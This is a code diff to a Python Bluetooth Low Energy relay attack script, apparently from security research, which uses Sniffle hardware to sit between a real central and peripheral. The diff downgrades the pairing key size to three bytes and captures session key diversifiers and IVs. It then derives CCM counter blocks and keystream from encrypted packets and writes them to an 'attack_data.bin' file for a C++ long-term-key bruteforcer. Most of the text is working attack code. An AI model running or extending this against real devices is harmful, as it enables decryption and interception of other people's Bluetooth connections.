@@ -26,6 +26,11 @@ from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode
 
 from mitble_help import downgrade_pairing_request, downgrade_pairing_response, make_ble_ccm_nonce, make_ble_ccm_counter_block, ble_ccm_encrypt
 
+
+from pathlib import Path
+from datetime import datetime
+import os
+import subprocess
 """
 Relay attack principles:
 
@@ -78,6 +83,7 @@ Empty--------->
 
 # global variable to access hardware
 hw = None
+new_key_size = 0x03
 
 found_key = None                  
 _found_key_lock = threading.Lock()
@@ -106,9 +112,18 @@ ivm_from_c = None   # IVm from real central C (C -> P_r, LL_ENC_REQ)
 ivs_from_p = None   # IVs from real peripheral P (P -> C_r, LL_ENC_RSP)
 iv_real_cp = None   # IVm_from_c || IVs_from_p
 
+
 skdm_from_c  = None
 skds_from_p  = None
 skd_real_cp  = None
+
+
+PROJECT_ROOT = Path(__file__).resolve().parent
+BRUTEFORCER_DIR = PROJECT_ROOT / "bruteforcer"
+EXPERIMENTS_DIR = BRUTEFORCER_DIR / "experiments"
+BRUTEFORCER_BIN = BRUTEFORCER_DIR / "bruteforce_ltk"  # C++ binary
+
+EXPERIMENTS_DIR.mkdir(parents=True, exist_ok=True)
 
 def sigint_handler(sig, frame):
     hw.cancel_recv()
@@ -145,10 +160,9 @@ def main():
     aparse.add_argument("--periph-baud", type=int, default=115200,
         help="Baudrate for the REAL peripheral (default: 115200)")
     args = aparse.parse_args()
-    global hw, periph_ser
+    global hw, periph_ser, new_key_size
     hw = SniffleHW(args.serport)
     
-    new_key_size = 0x02
 
 
     # put the hardware in a normal state (passive scanning) and configure it with an impossibly
@@ -334,10 +348,10 @@ def main():
         ready, _, _ = select(fds, [], [])
 
         if conn.sock in ready:
-            sock_recv_print_forward(conn, args.quiet, new_key_size, filter_changes)
+            sock_recv_print_forward(conn, args.quiet, filter_changes)
 
         if hw.ser.fd in ready:
-            ser_recv_print_forward(conn, args.quiet, new_key_size, filter_changes)
+            ser_recv_print_forward(conn, args.quiet, filter_changes)
 
         if periph_ser is not None:
             try:
@@ -367,6 +381,50 @@ def has_instant(pkt):
 
 def is_param_req(pkt):
     return isinstance(pkt, LlControlMessage) and pkt.opcode == 0x0F
+
+
+def create_experiment_dir() -> Path:
+    """
+    Create a unique subdirectory for this experiment under bruteforcer/experiments.
+    Example: bruteforcer/experiments/20251126_163215_12345/
+    """
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
+    pid = os.getpid()
+    exp_id = f"{timestamp}_{pid}"
+    exp_dir = EXPERIMENTS_DIR / exp_id
+    exp_dir.mkdir(parents=True, exist_ok=False)
+    return exp_dir
+
+
+def write_attack_data_binary(exp_dir: Path,
+                             key_size: int,
+                             plaintext: bytes,
+                             ciphertext: bytes,
+                             skd: bytes) -> Path:
+    """
+    attack_data.bin format (raw binary):
+        key_size (1 byte)
+        plaintext / counter block (16 bytes)
+        ciphertext / keystream (16 bytes)
+        SKD (16 bytes)
+    """
+    if not (1 <= key_size <= 16):
+        raise ValueError(f"key_size must be 1..16, got {key_size}")
+    if len(plaintext) != 16 or len(ciphertext) != 16 or len(skd) != 16:
+        raise ValueError("plaintext, ciphertext, SKD must all be 16 bytes")
+
+    attack_path = exp_dir / "attack_data.bin"
+    with attack_path.open("wb") as f:
+        f.write(bytes([key_size]))
+        f.write(plaintext)
+        f.write(ciphertext)
+        f.write(skd)
+
+    print(f"[BRUTEFORCER] Wrote attack data to {attack_path}")
+    print(f"[BRUTEFORCER] Run your C++ tool like:")
+    print(f"    cd {BRUTEFORCER_DIR}")
+    print(f"    ./bruteforcer_ltk {attack_path.name}")
+    return attack_path
 
 def _hex_bytes(b: bytes) -> str:
     return " ".join(f"{x:02x}" for x in b)
@@ -432,16 +490,15 @@ def _extract_skd_iv_from_ll_enc_rsp(ctrl: LlControlMessage):
     return skds, ivs
 
 
-
-def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
+def ser_recv_print_forward(conn, quiet, filter_changes=False):
     global enc_start_seen, first_enc_rsp_pkt
     global ivm_from_c, ivs_from_p, iv_real_cp
     global uart_test_pending, uart_last_seq
     global link_encryption_active, enc_ctr_p_to_c, enc_ctr_c_to_p
     global last_sn_p_to_c, last_sn_c_to_p
     global last_pdu_p_to_c, last_pdu_c_to_p   # NEW: track last PDU bytes per direction
-    global skdm_from_c, skds_from_p, skd_real_cp
-
+    global skd_real_cp, skdm_from_c, skds_from_p
+    global new_key_size
     msg = hw.recv_and_decode()
 
     if isinstance(msg, PacketMessage):
@@ -509,8 +566,8 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
                                 print("P->C_r retransmit (SN unchanged, PDU identical) – not incrementing counter")
                             else:
                                 # SN same but payload changed => treat as NEW and resync
-                                enc_ctr_p_to_c += 1
                                 packet_counter = enc_ctr_p_to_c
+                                enc_ctr_p_to_c += 1
                                 last_sn_p_to_c = sn_bit  # unchanged but we confirm
                                 last_pdu_p_to_c = pdu
                                 print(f"P->C_r NEW encrypted PDU (SN same but payload changed) – packetCounter={packet_counter}")
@@ -577,26 +634,35 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
                 print(f"MIC (encrypted): {_hx(mic_on_air)}")
 
                 if iv_real_cp is not None and packet_counter is not None:
-                    #nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter, direction_bit)
-                    #a0 = make_ble_ccm_counter_block(nonce, block_index=1)
-                    #plaintext_test = bytes([0x42, uart_last_seq] + [0xA5] * 14)
-                    #ciphertext_test = ciphertext[-VALUE_LEN:]
-                    #keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
-                    #print(f"       Plaintext for HULK: {_hx(a0)}")
-                    #print(f"       Ciphertext for HULK: {_hx(keystream)}")
-                    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter, 0)
+                    #IV should be given from LSB to MSB, so concatenate IV's like IV_c||IV_p
+                    #It is not the same concatenation as SPEC, but this way IV is printed the same as in NIMBLE, easier to compare and see if IV is correct
+                    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter, 0) 
                     a0 = make_ble_ccm_counter_block(nonce, block_index=2)
-                    plaintext_test = bytes(16)
                     ciphertext_test = ciphertext[-VALUE_LEN:]
+                    plaintext_test = bytes(16)
                     keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
-                    print(f"       Plaintext for HULK: {_hx(a0)}")
-                    print(f"       Ciphertext for HULK: {_hx(keystream)}")
-                    with open("bruteforcer.txt", "a") as f:
-                        f.write(f"{_hx(nonce)}\n")
-                        f.write(f"{_hx(keystream)}\n")                        
-                        f.write(f"{_hx(a0)}\n")
-                        f.write(f"{_hx(keystream)}\n")
-                        f.write("\n")  # blank line between entries (optional)
+                    if skd_real_cp is None:
+                        print("[BRUTEFORCER] SKD not yet known, cannot write attack data")
+                    else:
+                        # SKD should be given from MSB to LSB, so concatenate IV's like SKD_c||SKD_p does not work
+                        # We flip the bytes, so we get the same convention as in the SPEC and NIMBLE
+                        # TODO fix it when concatenation is done
+                        skd_for_aes = skd_real_cp[::-1]
+
+                        print(f"       Counter block (P): {_hx(a0)}")
+                        print(f"       Keystream (C):    {_hx(keystream)}")
+                        print(f"       SKD:              {_hx(skd_for_aes)}")
+
+                       
+                        key_size = new_key_size
+                        exp_dir = create_experiment_dir()
+                        write_attack_data_binary(
+                            exp_dir,
+                            key_size,
+                            a0,            
+                            keystream,     
+                            skd_for_aes,   
+                        )
 
 
         # LL_ENC_RSP from P to extract IV
@@ -647,12 +713,12 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
 
 
 
-def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
+def sock_recv_print_forward(conn, quiet,filter_changes=False):
     global enc_start_seen, first_enc_rsp_pkt
     global ivm_from_c, ivs_from_p, iv_real_cp
     global uart_test_pending, uart_last_seq
-    global skdm_from_c, skds_from_p, skd_real_cp
-
+    global skd_real_cp, skdm_from_c, skds_from_p
+    global new_key_size
     # receive packets from relay slave and retransmit them here
     mtype, body = conn.recv_msg()
     if mtype != MessageType.PACKET:
@@ -708,11 +774,10 @@ def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
         if skdm_from_c is not None and skds_from_p is not None and skd_real_cp is None:
             skd_real_cp = skdm_from_c + skds_from_p
             print(f"[SKD] Combined real C<->P SKD (SKDm||SKDs): {_hx(skd_real_cp)}")
-
-        # Passing on PDUs with instants in the past would break the connection
-        if not (filter_changes and has_instant(pkt)):
-            hw.cmd_transmit(llid, pdu, event)
-        print_message(pkt, quiet)
+    # Passing on PDUs with instants in the past would break the connection
+    if not (filter_changes and has_instant(pkt)):
+        hw.cmd_transmit(llid, pdu, event)
+    print_message(pkt, quiet)
 
 
 def print_message(msg, quiet=False):
